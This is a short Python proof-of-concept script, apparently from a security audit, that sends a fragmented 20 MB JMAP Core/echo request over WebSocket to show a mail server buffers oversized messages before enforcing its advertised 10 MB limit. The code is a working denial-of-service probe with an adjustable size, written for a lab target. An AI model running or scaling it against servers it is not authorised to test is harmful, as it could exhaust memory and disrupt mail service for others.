#!/usr/bin/env python3
# F7: JMAP-over-WebSocket buffers messages up to tungstenite's 64 MiB default before applying
# the advertised maxSizeRequest (10 MB). Sends a fragmented 20 MB Core/echo and shows the server
# only rejects it after reading it all. Needs: pip install websockets. Harmless: one request, one connection.
import asyncio, base64, json, os, sys, websockets
host = os.environ.get("SW_HOST", "http://127.0.0.1:8080").replace("http", "ws", 1) + "/jmap/ws"
user = os.environ.get("SW_USER", "user1@lab.test:CHANGE_ME")
auth = "Basic " + base64.b64encode(user.encode()).decode()
mb = int(sys.argv[1]) if len(sys.argv) > 1 else 20
async def main():
    m = json.dumps({"@type":"Request","using":["urn:ietf:params:jmap:core"],
                    "methodCalls":[["Core/echo",{"pad":"x"*(mb*1024*1024)},"c0"]]})
    async with websockets.connect(host, subprotocols=["jmap"], additional_headers={"Authorization": auth},
                                  max_size=None, compression=None, proxy=None) as ws:
        await ws.send(m[i:i+1048576] for i in range(0, len(m), 1048576))   # 1 MiB fragments
        r = await asyncio.wait_for(ws.recv(), 120)
        print(f"sent {len(m)/1048576:.1f} MiB (limit advertised: 10 MB); server reply: {r[:170]}")
        print("RESULT:", "VULNERABLE - whole message was buffered before the size check" if "maxSizeRequest" in r else "unexpected reply")
asyncio.run(main())
